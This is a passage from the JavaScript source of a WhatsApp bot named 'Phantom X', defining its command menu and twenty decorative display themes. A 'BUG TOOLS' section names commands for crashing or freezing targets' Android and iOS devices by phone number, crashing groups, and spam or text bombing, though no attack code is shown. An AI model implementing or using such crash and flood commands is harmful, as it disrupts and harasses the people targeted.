            ['.mute'], ['.unmute'], ['.groupinfo'],
            ['.adminlist'], ['.membercount'], ['.everyone ‹msg›'],
        ]},
        { emoji: '🏷️', title: 'TAG & ANNOUNCE', items: [
            ['.hidetag'], ['.tagall'], ['.readmore'],
            ['.broadcast ‹mins› ‹message›'], ['.stopbroadcast'],
            ['.schedule ‹HH:MM› ‹message›'], ['.unschedule ‹HH:MM›'], ['.schedules'],
        ]},
        { emoji: '⚙️', title: 'AUTOMATION', items: [
            ['.autoreact on/off/emoji'], ['.autoreply add/remove/list'],
            ['.setalias ‹word› ‹.cmd›'], ['.delalias ‹word›'], ['.aliases'],
            ['.antidelete on/off'], ['.antibot on/off'],
        ]},
        { emoji: '🧠', title: 'AI & MEDIA', items: [
            ['.ai ‹question›'], ['.imagine ‹prompt›'],
            ['.song ‹title›'], ['.lyrics ‹artist› | ‹title›'],
            ['.ss ‹url›'], ['.viewonce'], ['.ocr'],
            ['.translate ‹lang› ‹text›'], ['.weather ‹city›'],
        ]},
        { emoji: '🔍', title: 'UTILITIES', items: [
            ['.calc ‹expression›'], ['.groupid'],
            ['.listonline'], ['.listoffline'],
            ['.bible'], ['.quran'],
            ['.setstatus ‹text›'], ['.setname ‹name›'],
        ]},
        { emoji: '⚽', title: 'FOOTBALL', items: [
            ['.pltable'], ['.live'], ['.fixtures ‹club›'],
            ['.fnews ‹club›'], ['.football ‹club›'],
        ]},
        { emoji: '🎮', title: 'GAMES', items: [
            ['.ttt @p1 @p2'], ['.truth'], ['.dare'],
            ['.wordchain ‹word›'], ['.flip'], ['.dice'],
            ['.8ball ‹question›'], ['.rps rock/paper/scissors'],
            ['.slots'], ['.trivia'], ['.hangman ‹guess›'],
            ['.numguess'], ['.riddle'], ['.mathquiz'],
            ['.wouldurather'], ['.scramble'],
        ]},
        { emoji: '😂', title: 'FUN', items: [
            ['.joke'], ['.fact'], ['.quote'],
            ['.roast @user'], ['.compliment @user'],
            ['.ship @user1 @user2'], ['.rate @user'],
            ['.vibe @user'], ['.horoscope ‹sign›'],
        ]},
        { emoji: '🛡️', title: 'GROUP PROTECTION', items: [
            ['.antilink on/off'], ['.antispam on/off'],
            ['.antidemote on/off'],
        ]},
        { emoji: '📣', title: 'NOTIFICATIONS', items: [
            ['.welcome on/off'], ['.goodbye on/off'],
        ]},
        { emoji: '🔄', title: 'GC CLONE', items: [
            ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
        ]},
        { emoji: '💥', title: 'BUG TOOLS', items: [
            ['.bugmenu'], ['.bugmenu android'], ['.bugmenu ios'],
            ['.bugmenu freeze'], ['.bugmenu group'],
            ['.androidbug ‹number›'], ['.iosbug ‹number›'],
            ['.forceclose ‹number›'], ['.freeze ‹number›'],
            ['.invisfreeze ‹number›'], ['.unbug ‹number›'],
            ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
            ['.ungroupcrash ‹groupId›'],
            ['.lockedbypass ‹text›'],
            ['.emojibomb @user'], ['.textbomb @user ‹text› ‹times›'],
            ['.spamatk @user ‹times›'], ['.ghostping @user'],
            ['.zalgo ‹text›'], ['.bigtext ‹text›'],
            ['.invisible'], ['.rtl ‹text›'],
            ['.mock ‹text›'], ['.aesthetic ‹text›'],
            ['.reverse ‹text›'], ['.clap ‹text›'],
        ]},
        { emoji: '🛠️', title: 'EXTRAS', items: [
            ['.sticker'], ['.toimg'],
            ['.qr ‹text›'], ['.genpwd ‹length›'],
            ['.base64 encode/decode ‹text›'],
            ['.chat ‹message›'], ['.autojoin on/off'],
        ]},
    ];
}

// ─── THEME 1: GHOST ───
function buildThemeGhost(ml, time, up, S) {
    let o = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n   ☠️  *P H A N T O M  ✘*  ☠️\n   _The Ghost in Your Machine_ 👻\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n◈ ◈ ◈  *S Y S T E M  S T A T U S*  ◈ ◈ ◈\n\n  🤖  *Bot*     ›  Phantom X\n  📌  *Ver*     ›  v${BOT_VERSION}\n  🌐  *Mode*    ›  ${ml}\n  ⏱️  *Uptime*  ›  ${up}\n  🕐  *Time*    ›  ${time}\n`;
    for (const s of S) { o += `\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n〔 ${s.emoji} *${s.title}* 〕\n\n`; for (const [c] of s.items) o += `  ✦  *${c}*\n`; }
    return (o + `\n╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n  💀 _Phantom X — Built Different. Built Cold._ 🖤\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯`).trim();
}

// ─── THEME 2: MATRIX ───
function buildThemeMatrix(ml, time, up, S) {
    let o = `█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n█   💻  *PHANTOM_X  v${BOT_VERSION}*   💻   █\n█   _> SYSTEM ONLINE ✓_         █\n█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n\n*[ SYS_INFO ]*\n  »  *Bot*    :  Phantom X\n  »  *Mode*   :  ${ml}\n  »  *Uptime* :  ${up}\n  »  *Time*   :  ${time}\n`;
    for (const s of S) { o += `\n══════════════════════════════\n*[ MODULE :: ${s.title} ]*  ${s.emoji}\n`; for (const [c] of s.items) o += `  *>*  \`${c}\`\n`; }
    return (o + `\n══════════════════════════════\n_> PHANTOM_X — Ghost Protocol Active._ 👻`).trim();
}

// ─── THEME 3: ROYAL ───
function buildThemeRoyal(ml, time, up, S) {
    let o = `♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n         👑  *PHANTOM X*  👑\n    _ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ. ᴅɪɢɪᴛᴀʟ._\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n\n✦ *ROYAL STATUS* ✦\n\n   ◆  *Bot*     ∷  Phantom X\n   ◆  *Version* ∷  v${BOT_VERSION}\n   ◆  *Mode*    ∷  ${ml}\n   ◆  *Uptime*  ∷  ${up}\n   ◆  *Time*    ∷  ${time}\n`;
    for (const s of S) { o += `\n═══════════════════════════════\n❖  *${s.emoji} ${s.title}*  ❖\n\n`; for (const [c] of s.items) o += `   ◆  *${c}*\n`; }
    return (o + `\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n  👑 _Phantom X — The Digital Monarch_ 🖤\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛`).trim();
}

// ─── THEME 4: INFERNO ───
function buildThemeInferno(ml, time, up, S) {
    let o = `🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n   💥  *P H A N T O M  X*  💥\n   _No Cap. No Mercy. Built Cold._ 🥶\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n\n⚡ *SYSTEM STATUS* ⚡\n\n  🔸  *Bot*     »  Phantom X\n  🔸  *Version* »  v${BOT_VERSION}\n  🔸  *Mode*    »  ${ml}\n  🔸  *Uptime*  »  ${up}\n  🔸  *Time*    »  ${time}\n`;
    for (const s of S) { o += `\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥\n💀 *${s.emoji} ${s.title}* 💀\n\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
    return (o + `\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n  💀 _Phantom X — Straight Savage. No Filter._ 🔥\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`).trim();
}

// ─── THEME 5: MINIMAL ───
function buildThemeMinimal(ml, time, up, S) {
    let o = `─────────────────────────────\n   ✧  *PHANTOM X*  ·  v${BOT_VERSION}  ✧\n─────────────────────────────\n\n  Bot    ·  Phantom X\n  Mode   ·  ${ml}\n  Uptime ·  ${up}\n  Time   ·  ${time}\n`;
    for (const s of S) { o += `\n─────────────────────────────\n  *${s.emoji} ${s.title}*\n─────────────────────────────\n`; for (const [c] of s.items) o += `  ›  *${c}*\n`; }
    return (o + `\n─────────────────────────────\n  _Phantom X — Built Different_ 🖤\n─────────────────────────────`).trim();
}

// ─── THEME 6: VOID (Ultimate Hacker · Echo Protocol) ───
function buildThemeVoid(ml, time, up, S) {
    let o = `▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n        𝚅  𝙾  𝙸  𝙳\n   𝙿𝙷𝙰𝙽𝚃𝙾𝙼_𝚇 :: 𝙴𝙲𝙷𝙾_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻\n\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n> initializing ghost_shell...\n> loading kernel............. ✓\n> bypassing firewall......... ✓\n> identity_mask: ONLINE ✓\n> threat_level: MAXIMUM 🔴\n\n╔══════════════════════════╗\n║  *0x01*  BOT    →  𝙿𝚑𝚊𝚗𝚝𝚘𝚖 𝚇  ║\n║  *0x02*  VER    →  v${BOT_VERSION}         ║\n║  *0x03*  MODE   →  ${ml}  ║\n║  *0x04*  UPTIME →  ${up}  ║\n╚══════════════════════════╝\n`;
    let i = 0;
    for (const s of S) {
        o += `\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n:: ${s.emoji} ${s.title} ::\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n`;
        for (const [c] of s.items) { i++; o += `  [*${String(i).padStart(2,'0')}*]  *${c}*\n`; }
    }
    return (o + `\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n> 𝚃𝚁𝙰𝙽𝚂𝙼𝙸𝚂𝚂𝙸𝙾𝙽_𝙴𝙽𝙳 ◆ 𝙶𝙷𝙾𝚂𝚃_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻_𝙰𝙲𝚃𝙸𝚅𝙴\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓`).trim();
}

// ─── THEME 7: VAPORWAVE ───
function buildThemeVaporwave(ml, time, up, S) {
    let o = `░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  Ｐ Ｈ Ａ Ｎ Ｔ Ｏ Ｍ  Ｘ\n  ａ ｅ ｓ ｔ ｈ ｅ ｔ ｉ ｃ\n\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  ♡  Ｂｏｔ      ：  Ｐｈａｎｔｏｍ Ｘ\n  ♡  Ｖｅｒｓｉｏｎ  ：  ｖ${BOT_VERSION}\n  ♡  Ｍｏｄｅ     ：  ${ml}\n  ♡  Ｕｐｔｉｍｅ   ：  ${up}\n  ♡  Ｔｉｍｅ     ：  ${time}\n`;
    for (const s of S) { o += `\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n  ${s.emoji}  ｛  *${s.title}*  ｝\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n`; for (const [c] of s.items) o += `  ✦ ｜  *${c}*\n`; }
    return (o + `\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n  ｐｈａｎｔｏｍ ｘ  ♡  ｂｕｉｌｔ ｄｉｆｆｅｒｅｎｔ\n░░░░░░░░░░░░░░░░░░░░░░░░░░░`).trim();
}

// ─── THEME 8: GOTHIC ───
function buildThemeGothic(ml, time, up, S) {
    let o = `✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n   𝔓 𝔥 𝔞 𝔫 𝔱 𝔬 𝔪  𝔛\n  _𝔗𝔥𝔢 𝔇𝔞𝔯𝔨 𝔒𝔯𝔡𝔢𝔯 𝔄𝔴𝔞𝔨𝔢𝔫𝔰_\n\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n  ☩  𝔅𝔬𝔱      ∶  𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛\n  ☩  𝔙𝔢𝔯𝔰𝔦𝔬𝔫  ∶  ｖ${BOT_VERSION}\n  ☩  𝔐𝔬𝔡𝔢     ∶  ${ml}\n  ☩  𝔘𝔭𝔱𝔦𝔪𝔢   ∶  ${up}\n  ☩  𝔗𝔦𝔪𝔢     ∶  ${time}\n`;
    for (const s of S) { o += `\n✠═══════════════════════════✠\n  ☩  *${s.emoji} ${s.title}*\n✠═══════════════════════════✠\n`; for (const [c] of s.items) o += `  ✝  *${c}*\n`; }
    return (o + `\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n  ☩ _𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛 — 𝔅𝔲𝔦𝔩𝔱 𝔬𝔣 𝔇𝔞𝔯𝔨𝔫𝔢𝔰𝔰_ 🖤\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠`).trim();
}

// ─── THEME 9: CURSIVE ───
function buildThemeCursive(ml, time, up, S) {
    let o = `❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n   𝒫 𝒽 𝒶 𝓃 𝓉 ℴ 𝓂  𝒳\n  _𝒢𝒽ℴ𝓈𝓉 𝒾𝓃 𝓉𝒽ℯ 𝒮𝒽ℯ𝓁𝓁_ ✨\n\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n  ❧  𝐵ℴ𝓉      ·  𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳\n  ❧  𝒱ℯ𝓇𝓈𝒾ℴ𝓃  ·  v${BOT_VERSION}\n  ❧  𝑀ℴ𝒹ℯ     ·  ${ml}\n  ❧  𝒰𝓅𝓉𝒾𝓂ℯ   ·  ${up}\n  ❧  𝒯𝒾𝓂ℯ     ·  ${time}\n`;
    for (const s of S) { o += `\n❦───────────────────────────❦\n  ❧ *${s.emoji} ${s.title}*\n❦───────────────────────────❦\n`; for (const [c] of s.items) o += `  ❧  *${c}*\n`; }
    return (o + `\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n  ❧ _𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳 — 𝐵𝓊𝒾𝓁𝓉 𝒟𝒾𝒻𝒻ℯ𝓇ℯ𝓃𝓉_ 🖤\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦`).trim();
}

// ─── THEME 10: COSMOS ───
function buildThemeCosmos(ml, time, up, S) {
    let o = `🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n   🛸  *P H A N T O M  X*  🛸\n   _Drifting Through the Digital Void_\n\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n  🌟  *Bot*     ⟶  Phantom X\n  🪐  *Version* ⟶  v${BOT_VERSION}\n  🛰️  *Mode*    ⟶  ${ml}\n  ☄️  *Uptime*  ⟶  ${up}\n  🌙  *Time*    ⟶  ${time}\n`;
    for (const s of S) { o += `\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n🌌 *${s.emoji} ${s.title}* 🌌\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n`; for (const [c] of s.items) o += `  🌠  *${c}*\n`; }
    return (o + `\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n  🛸 _Phantom X — Lost in the Stars_ ✨\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌`).trim();
}

// ─── THEME 11: SOFT ───
function buildThemeSoft(ml, time, up, S) {
    let o = `˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n   ℙ ℍ 𝔸 ℕ 𝕋 𝕆 𝕄  𝕏\n  _ꜱᴏꜰᴛ. ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ._ 🌸\n\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n  ˚✦  *ᴮᵒᵗ*       ⌇  Phantom X\n  ˚✦  *ᵛᵉʳˢⁱᵒⁿ*   ⌇  v${BOT_VERSION}\n  ˚✦  *ᴹᵒᵈᵉ*      ⌇  ${ml}\n  ˚✦  *ᵁᵖᵗⁱᵐᵉ*    ⌇  ${up}\n  ˚✦  *ᵀⁱᵐᵉ*      ⌇  ${time}\n`;
    for (const s of S) { o += `\n˚ · . ꒰ ${s.emoji} *${s.title}* ꒱ . · ˚\n`; for (const [c] of s.items) o += `  ♡  *${c}*\n`; }
    return (o + `\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n  🌸 _Phantom X — Soft but Deadly_ 💫\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚`).trim();
}

// ─── THEME 12: DIAMOND ───
function buildThemeDiamond(ml, time, up, S) {
    let o = `◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n   💎  *𝐏 𝐇 𝐀 𝐍 𝐓 𝐎 𝐌  𝐗*  💎\n   _𝐄𝐥𝐢𝐭𝐞. 𝐏𝐨𝐥𝐢𝐬𝐡𝐞𝐝. 𝐋𝐞𝐠𝐞𝐧𝐝𝐚𝐫𝐲._\n\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n  💠  *𝐁𝐨𝐭*      ⬩  𝐏𝐡𝐚𝐧𝐭𝐨𝐦 𝐗\n  💠  *𝐕𝐞𝐫𝐬𝐢𝐨𝐧* ⬩  v${BOT_VERSION}\n  💠  *𝐌𝐨𝐝𝐞*     ⬩  ${ml}\n  💠  *𝐔𝐩𝐭𝐢𝐦𝐞*   ⬩  ${up}\n  💠  *𝐓𝐢𝐦𝐞*     ⬩  ${time}\n`;
    for (const s of S) { o += `\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n💎 *${s.emoji} ${s.title}* 💎\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n`; for (const [c] of s.items) o += `  ◆  *${c}*\n`; }
    return (o + `\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n  💎 _Phantom X — Rare. Refined. Relentless._ 💎\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇`).trim();
}

// ─── THEME 13: THUNDER ───
function buildThemeThunder(ml, time, up, S) {
    let o = `⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗣 𝗛 𝗔 𝗡 𝗧 𝗢 𝗠  𝗫*  ⚡\n  _𝗦𝘁𝗿𝗶𝗸𝗲𝘀 𝗟𝗶𝗸𝗲 𝗟𝗶𝗴𝗵𝘁𝗻𝗶𝗻𝗴. 𝗡𝗼 𝗪𝗮𝗿𝗻𝗶𝗻𝗴._\n\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗕𝗼𝘁*      ⟹  Phantom X\n  ⚡  *𝗩𝗲𝗿𝘀𝗶𝗼𝗻* ⟹  v${BOT_VERSION}\n  ⚡  *𝗠𝗼𝗱𝗲*     ⟹  ${ml}\n  ⚡  *𝗨𝗽𝘁𝗶𝗺𝗲*  ⟹  ${up}\n  ⚡  *𝗧𝗶𝗺𝗲*     ⟹  ${time}\n`;
    for (const s of S) { o += `\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n  *${s.emoji} ${s.title}*\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
    return (o + `\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n  ⚡ _Phantom X — 𝗨𝗻𝘀𝘁𝗼𝗽𝗽𝗮𝗯𝗹𝗲. 𝗨𝗻𝘁𝗿𝗮𝗰𝗲𝗮𝗯𝗹𝗲._ ⚡\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡`).trim();
}

// ─── THEME 14: WARRIOR ───
function buildThemeWarrior(ml, time, up, S) {
    let o = `⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n   🛡️  *ᴘʜᴀɴᴛᴏᴍ  x*  🛡️\n   _ꜰᴏʀɢᴇᴅ ɪɴ ᴛʜᴇ ᴅɪɢɪᴛᴀʟ ꜰɪʀᴇ_\n\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n  🗡️  *ʙᴏᴛ*      ⟫  Phantom X\n  🗡️  *ᴠᴇʀꜱɪᴏɴ*  ⟫  v${BOT_VERSION}\n  🗡️  *ᴍᴏᴅᴇ*     ⟫  ${ml}\n  🗡️  *ᴜᴘᴛɪᴍᴇ*   ⟫  ${up}\n  🗡️  *ᴛɪᴍᴇ*     ⟫  ${time}\n`;
    for (const s of S) { o += `\n⚔️ ──────────────────────── ⚔️\n  🛡️ *${s.emoji} ${s.title}*\n⚔️ ──────────────────────── ⚔️\n`; for (const [c] of s.items) o += `  🗡️  *${c}*\n`; }
    return (o + `\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n  🛡️ _ᴘʜᴀɴᴛᴏᴍ x — ɴᴏ ᴍᴇʀᴄʏ. ɴᴏ ʀᴇᴛʀᴇᴀᴛ._ ⚔️\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️`).trim();
}

// ─── THEME 15: NEON ───
function buildThemeNeon(ml, time, up, S) {
    let o = `🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🌈  *Ⓟ Ⓗ Ⓐ Ⓝ Ⓣ Ⓞ Ⓜ  ✘*  🌈\n  _Ⓛⓘⓣ  ⓤⓟ.  Ⓑⓤⓘⓛⓣ  ⓓⓘⓕⓕⓔⓡⓔⓝⓣ._\n\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🟣  *Bot*      ⇒  Phantom X\n  🔵  *Version*  ⇒  v${BOT_VERSION}\n  🟢  *Mode*     ⇒  ${ml}\n  🟡  *Uptime*   ⇒  ${up}\n  🟠  *Time*     ⇒  ${time}\n`;
    const neonDots = ['🟣','🔵','🟢','🟡','🟠','🔴']; let ni = 0;
    for (const s of S) { o += `\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n${neonDots[ni%6]}  *${s.emoji} ${s.title}*\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n`; ni++; for (const [c] of s.items) o += `  ${neonDots[ni%6]}  *${c}*\n`; }
    return (o + `\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n  🌈 _Phantom X — Neon. Bold. Unstoppable._ 🌈\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣`).trim();
}

// ─── THEME 16: SPY ───
function buildThemeSpy(ml, time, up, S) {
    let o = `🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  ██  *[CLASSIFIED]*  ██\n  *PHANTOM X* — OPERATION: GHOST\n  _CLEARANCE LEVEL: ULTRA_ 🔐\n\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  🔐  *AGENT*    :  PHANTOM X\n  🔐  *VERSION*  :  v${BOT_VERSION} [REDACTED]\n  🔐  *ACCESS*   :  ${ml}\n  🔐  *RUNTIME*  :  ${up}\n  🔐  *LOCAL_T*  :  ${time}\n`;
    for (const s of S) { o += `\n██████████████████████████\n🔐 *[MODULE :: ${s.title}]* ${s.emoji}\n██████████████████████████\n`; for (const [c] of s.items) o += `  ⬛  *${c}*\n`; }
    return (o + `\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n  🔐 _[END OF FILE] — PHANTOM X // EYES ONLY_ 🕵️\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️`).trim();
}

// ─── THEME 17: PIRATE ───
function buildThemePirate(ml, time, up, S) {
    let o = `🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n   ☠️  *P H A N T O M  X*  ☠️\n   _Sail the Digital Seas. Fear No Code._\n\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n  ⚓  *Ship*    »  Phantom X\n  ⚓  *Ver*     »  v${BOT_VERSION}\n  ⚓  *Crew*    »  ${ml}\n  ⚓  *Voyage*  »  ${up}\n  ⚓  *Waters*  »  ${time}\n`;
    for (const s of S) { o += `\n☠️ ─────────────────────────☠️\n  ⚓ *${s.emoji} ${s.title}*\n☠️ ─────────────────────────☠️\n`; for (const [c] of s.items) o += `  🗺️  *${c}*\n`; }
    return (o + `\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n  ⚓ _Phantom X — Plunder the Net. Leave No Trace._ ☠️\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️`).trim();
}

// ─── THEME 18: SHADOW ───
function buildThemeShadow(ml, time, up, S) {
    let o = `◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n   🌑  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*  🌑\n   _𝘈𝘭𝘸𝘢𝘺𝘴 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨. 𝘕𝘦𝘷𝘦𝘳 𝘚𝘦𝘦𝘯._\n\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n  🌑  *Bot*      ⌁  Phantom X\n  🌑  *Version*  ⌁  v${BOT_VERSION}\n  🌑  *Mode*     ⌁  ${ml}\n  🌑  *Uptime*   ⌁  ${up}\n  🌑  *Time*     ⌁  ${time}\n`;
    for (const s of S) { o += `\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n  🌑 *${s.emoji} ${s.title}*\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n`; for (const [c] of s.items) o += `  🌑  *${c}*\n`; }
    return (o + `\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n  🌑 _Phantom X — The Shadow Never Sleeps_ 🖤\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼`).trim();
}

// ─── THEME 19: BOLD TECH ───
function buildThemeBoldTech(ml, time, up, S) {
    let o = `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  🔲  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*\n  _𝑷𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒅 𝒕𝒐 𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆._\n\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  ▣  *Bot*      →  Phantom X\n  ▣  *Version*  →  v${BOT_VERSION}\n  ▣  *Mode*     →  ${ml}\n  ▣  *Uptime*   →  ${up}\n  ▣  *Time*     →  ${time}\n`;
    for (const s of S) { o += `\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n  ▣ *${s.emoji} ${s.title}*\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n`; for (const [c] of s.items) o += `  ▣  *${c}*\n`; }
    return (o + `\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n  ▣ _Phantom X — 𝑷𝒓𝒆𝒄𝒊𝒔𝒊𝒐𝒏. 𝑷𝒐𝒘𝒆𝒓. 𝑷𝒉𝒂𝒏𝒕𝒐𝒎._ 🔲\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`).trim();
}

// ─── THEME 20: ECHO ───
function buildThemeEcho(ml, time, up, S) {
    let o = `· · · · · · · · · · · · · · ·\n   ·   *P H A N T O M  X*   ·\n  · ·  _E · C · H · O_  · ·\n · · ·  )))  signal lost  · · ·\n· · · · · · · · · · · · · · ·\n\n  )))  Bot      ~  Phantom X\n  )))  Version  ~  v${BOT_VERSION}\n  )))  Mode     ~  ${ml}\n  )))  Uptime   ~  ${up}\n  )))  Time     ~  ${time}\n`;
    for (const s of S) { o += `\n· · · · · · · · · · · · · · ·\n  ))) *${s.emoji} ${s.title}* (\n· · · · · · · · · · · · · · ·\n`; for (const [c] of s.items) o += `  ·))  *${c}*\n`; }
    return (o + `\n· · · · · · · · · · · · · · ·\n  ))) _Phantom X — Echo fades. Ghost remains._ ·\n· · · · · · · · · · · · · · ·`).trim();
}

// --- MENU ---
function buildMenuText(mode, themeNum) {
    const time = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" });
    const modeLabel = (mode || "public") === "owner" ? "👤 Owner Only" : "🌍 Public";
    const uptime = formatUptime();
    const n = Number(themeNum) || 1;
    const S = getMenuSections();
    const ml = modeLabel;
    const up = uptime;
    if (n === 2)  return buildThemeMatrix(ml, time, up, S);
    if (n === 3)  return buildThemeRoyal(ml, time, up, S);
    if (n === 4)  return buildThemeInferno(ml, time, up, S);
    if (n === 5)  return buildThemeMinimal(ml, time, up, S);
